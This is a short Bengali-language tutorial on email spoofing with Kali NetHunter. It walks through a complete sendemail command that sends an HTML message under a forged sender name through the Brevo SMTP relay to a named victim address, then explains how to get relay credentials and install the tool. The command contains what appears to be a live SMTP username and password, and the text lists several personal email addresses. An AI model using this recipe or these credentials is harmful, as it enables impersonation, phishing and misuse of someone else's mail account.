# আমরা এখন দেখবো কিভাবে ইমেইল spoofing করতে হয়

## স্পোকিং করার জন্য আমাদের একটি ভিকটিম ইমেইল এড্রেস প্রয়োজন পড়বে। উদাহরণ হিসেবে আমরা একটি ধরে নিচ্ছি: 
```
mail@bytecapsuleit.com
```
## এবং যার ইনবক্সে ইমেইলটি সেন্ড করব তার ইমেইল এড্রেস লাগবে। উদাহরণ হিসাবে: 
```
masshuvo.tv@gmail.com
```
### 👆 যখন আপনি নিজে প্র্যাকটিস করবেন তখন এখানে আপনার নিজের ইমেইল এড্রেস বসাবেন। 

Email Spoofing by Kali Nethunter

```
sendemail -f "MAS Hunter  <hridoykhan513494@gmail.com>" -t masshuvo.bd@gmail.com -u "Welcome To Our program" -m "$(cat welcome-email-xyimeasi.html)" -s smtp-relay.brevo.com:587 -xu  md.abubakkr990@gmail.com -xp c5MbJ3kLBVYszHt
```


This is sender Email: hridoykhan513494@gmail.com

This is victim Email: masshuvo.bd@gmail.com

# নিচে দেওয়া লিঙ্ক থেকে ওয়েবসাইটে ভিজিট করে নিজের ইমেইল দিয়ে একটা অ্যাকাউন্ট তৈরি করে নিতে হবে। 👇 তারপর সেখান থেকে এস এম টিপি সার্ভার নিতে হবে এবং পাসওয়ার্ড সেখানেই দেওয়া থাকবে।

Smtp server: https://app.brevo.com/settings/keys/smtp


Tool: sendemail 

Install: 
```
apt-get install sendemail -y
```
